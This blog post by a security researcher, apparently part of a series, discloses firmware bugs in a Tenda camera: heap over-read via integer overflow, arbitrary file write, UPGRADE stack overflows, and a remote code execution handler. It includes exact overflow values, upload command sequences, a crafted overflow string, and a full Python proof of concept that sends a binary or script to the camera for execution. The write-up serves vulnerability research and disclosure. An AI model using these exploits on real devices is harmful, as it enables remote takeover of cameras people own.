This is going to be a pretty long blog, there are a bunch of bugs, so I'll summarise each bug in a table in this section. If you want more detail, a detailed description and PoC will be provided!

All of these bugs were found on firmware version *2111220954* which contains previously reported bugs, I'll try and indicate which of these have already been discovered - in the next blog, I will update the camera to the latest firmware and see which ones are still 0-days! ## ! - Command Injection

This bug was disclosed by someone else first, it is a pretty straightforward backdoor-esque feature that is immediately obvious once you've named some stuff:

![command_injection_1.png](/assets/images/tenda_cam/p2/command_injection_1.png)

![blind_oob_read_1_crash.png](/assets/images/tenda_cam/p2/blind_oob_read_1_crash.png)

## Integer Overflow -> Remote Info Leak

I think that this is probably the most useful integer overflow I have ever discovered! It can be used in combination with the **upload** and **download** commands we found earlier to read HUGE chunks of heap memory full of interesting pointers.

The bug is in the processing of the initial message header, I haven't fully reversed it (as half of it doesn't seem to be used at all), but it goes something like this:

| Size | Description |
| - | - |
| int | Unused? |
| int | Size of the payload after the JSON string |
| int | Offset of the main payload from the start of the header (could also be the size of the JSON) |
| int | Unused? |

So the header is **0x10** bytes, then it is followed by a JSON string which specifies command and some parameters for the command, and finally there is the main *payload*.

![ytcp_user_thread_recv.png](/assets/images/tenda_cam/p2/ytcp_user_thread_recv.png)

Excuse the messy naming, but it is basically recieving the *0x10* byte header, getting the total size (adding together the *size* and the *offset* from the header), and then receiving that amount as the payload (can you see the next bug yet?).

Once this amount of data has been recieved, it goes into **parse_conn_buff** function for more processing:

![parse_conn_buff.png](/assets/images/tenda_cam/p2/parse_conn_buff.png)

First of all there is a couple of checks:
- Size of the buffer is not *<0x10* (buffer his fixed size of *0x10000*, hint for the next bug)
- *offset + size + 0x10* is less than the size of the buffer (*0x10000*)

If this check has passed, it calls the JSON parser to parse the JSON string before the payload. Next it checks if there is data after the JSON by checking the header value (and also makes sure that this value is not huge by casting it to an *int* and ensuring it is positive), and allocating this amount if it is non-zero. If the *malloc* succeeds, it uses the offset + the buffer address to get the *src* for the *memcpy* call, and uses the *size* as the amount to copy.

Alright cool, did you spot the bug? Lets consider what happens if we use a size of **0x20000** and an offset of **0xFFFEA000**:
- Amount recieved is *0xFFFEA000* + *0x20000* = *0xA000* (all good)
- *0x20000* + *0xFFFEA000* + *0x10* = *0xA000* (less than *0x10000* so check passes)
- *0x20000* cast to an int is positive

The **src** becomes the address of the allocated buffer to recv the message + *0xFFFEA000*, which is the same as doing - *0x16000* ish, meaning we are copying out of bounds of the heap buffer (data before the allocation).

*TLDR*: We can use the overflow to bypass the check in **parse_conn_buff**, and get the payload passed to the handlers to be OOB heap memory from before the allocated buffer.

We can then use the **upload** command by specifying it with the JSON string that gets processed before the **memcpy** occurs, letting us write the OOB heap memory to a file. Then we can simply use the **download** handler to read it!

## **upload** - Arbitrary File Write

Another command that does what it says on the tin - by building messages that consist of correct JSON payloads followed by chunks of file data, you can create and write into a file on the device in any writeable location.

You specify the path from the root directory, so there isn't even a directory traversal or anything you can just write a file anywhere!

The sequence of commands to send goes a bit like this, the payload offset and length are specific in the **conn_buff** (the message header):
- **{"cmd":"upload", "req_id": "0", "file":"/tmp/write_test", "begin": true}** + first chunk of file: This tells it to create the file (*begin* parameter)
- **while still bytes of file to send:**
    - **{"cmd":"upload", "req_id": "0", "file":"/tmp/write_test", "begin": false}** + next chunk of file: Build up the file until all bytes have been sent

## UPGRADE - Stack Overflow

Starting off this port with another stack overflow, this is in a **strncpy** call. When the command gets send, the code finds *\<METHOD>* and *\</METHOD>* tags using **strstr**, then the data between them is copied into a stack buffer of size *0x100* using **strncpy**. They calculate the amount to copy by getting the difference of the pointers, with no upper bounds check.

![stack_overflow_4.png](/assets/images/tenda_cam/p2/stack_overflow_4.png)

This one is a bit of a pain to debug, as the WiFi gets turned off (killing the gdb session), and the code expects other parts of the upgrade process to occur before it returns (and the clobbered **ra** is popped from the stack). By adding a break point on the **strncpy** call, it is infered that the buffer will overflow just by looking at the parameters:

![stack_overflow_4_evidence.png](/assets/images/tenda_cam/p2/stack_overflow_4_evidence.png)

*0x384* > *0x200* required to start overwriting saved registers on the stack!

## UPGRADE - Integer Underflow -> Stack Overflow

This is basically the same as the above bug, but you could patch the above bug (by capping the length) and still have this issue if you used integers, so I am counting it as a separate bug. The code snippet is the same as the above bug, so refer to that.

As they use **strstr** for locating the *METHOD* tags, you can specify *\</METHOD>* before *\<METHOD>*. This means when the length to copy is calculated, the length goes negative due to the ordering not being enforced - giving you a call to **strncpy** with a huge unsigned length (as it is really a negative integer).

Sending in **\<UPGRADE\>\</METHOD>AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA \<METHOD\>ABCDEFGHIJKLMNOP\<\/UPGRADE>** results in the following being passed to **strncpy**:

![integer_underflow_evidence.png](/assets/images/tenda_cam/p2/integer_underflow_evidence.png)

*r1* points to the data after **\<METHOD>** (*ABCDEFGHIJKLMNOP\</UPGRADE>*) which is what will be copied into the stack buffer.

## ELFEXEC - Binary/Script Execution

I remember when me and [iMoD1998](https://imod1998.dev/) had a very brief look at this camera back in 2023-ish we found this handler and decided this device was too easy, and since then it has been sat in a locker... However since then the bug has been discovered and patched (I think) which is why I took another look at this device.

You can essentially just throw an ELF (or script) at this handler, it will save it to a file, make it executable, and run it. I couldn't find a PoC out there for this bug, and I lost the original one I wrote (a.k.a. it is on my other PC and its easier to rewrite it than blow the dust off of that one), so here is the rewritten one:

```python
def ELFEXEC_1300(filename, path_to_write):
    # Create a TCP socket
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(10)
    
    # Connect to the target
    print(f"Connecting to {'192.168.55.1'}:{1300}...")
    sock.connect(('192.168.55.1', 1300))
    print("Connected successfully")

    with open(filename, 'rb') as f:
        # get file length
        f.seek(0, 2)
        file_length = f.tell()
        f.seek(0)
        
        # calculate MD5 checksum
        md5_hash = hashlib.md5()
        for chunk in iter(lambda: f.read(4096), b""):
            md5_hash.update(chunk)
        md5checksum = md5_hash.hexdigest()

        f.seek(0)
        
        payload = f'<ELFEXEC><FNAME>{path_to_write}</FNAME><FSIZE>{str(file_length)}</FSIZE><CHECKSUM>{md5checksum.upper()}</CHECKSUM></ELFEXEC>'.encode()
        payload += b'\x00' * (0x400 - len(payload)) # wont work without this

        print(payload)

        # start the request
        # Send the binary payload
        bytes_sent = sock.send(payload)
        print(f"Sent {bytes_sent} bytes")
        
        # Receive the response
        response = sock.recv(4096)  # Adjust buffer size as needed
        print(f"Received {len(response)} bytes")
        print(response)

        while(True):
            # Receive the response
            chunk = f.read(0x400)
            
            print("Sending:")
            print(chunk)

            response = sock.send(chunk)  # Adjust buffer size as needed
            print(response)

            if len(chunk) < 0x400:
                break

        time.sleep(1)
        sock.close()
```

Instead of sending an ELF as intended, you can just send an *ash* script in and it'll execute that as well.
